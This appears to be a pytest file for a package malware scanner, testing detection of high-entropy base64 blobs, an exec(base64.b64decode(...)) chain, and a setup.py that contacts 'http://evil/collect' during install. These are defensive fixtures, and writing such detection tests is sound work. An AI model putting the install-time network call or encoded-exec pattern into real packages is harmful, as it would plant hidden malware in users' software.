import base64

from app.analysis.analyzers.base import PackageContext, SourceFile
from app.analysis.analyzers.install_script import InstallScriptAnalyzer
from app.analysis.analyzers.obfuscation import ObfuscationAnalyzer, shannon_entropy
from app.analysis.signals import Code

obf = ObfuscationAnalyzer()
inst = InstallScriptAnalyzer()


def _ctx(files: dict[str, str]) -> PackageContext:
    return PackageContext(
        ecosystem="pypi", name="x", version="1.0",
        files=[SourceFile(relpath=k, text=v, size=len(v)) for k, v in files.items()],
    )


def test_entropy_of_base64_is_high():
    blob = base64.b64encode(b"A" * 400 + b"secret-payload" * 20).decode()
    assert shannon_entropy(blob) > 3.5


def test_encoded_exec_chain_detected():
    payload = base64.b64encode(b"print('x')" * 40).decode()
    src = f"import base64\nexec(base64.b64decode('{payload}'))\n"
    codes = {s.code for s in obf.analyze(_ctx({"m.py": src}))}
    assert Code.ENCODED_EXEC in codes


def test_install_time_network_is_critical():
    setup = (
        "from setuptools import setup\n"
        "import urllib.request\n"
        "urllib.request.urlopen('http://evil/collect')\n"
        "setup(name='x')\n"
    )
    signals = inst.analyze(_ctx({"setup.py": setup}))
    assert any(s.code == Code.INSTALL_HOOK_EXEC and s.severity.value == "critical" for s in signals)


def test_benign_setup_is_clean():
    setup = "from setuptools import setup\nsetup(name='x', version='1.0')\n"
    assert inst.analyze(_ctx({"setup.py": setup})) == []
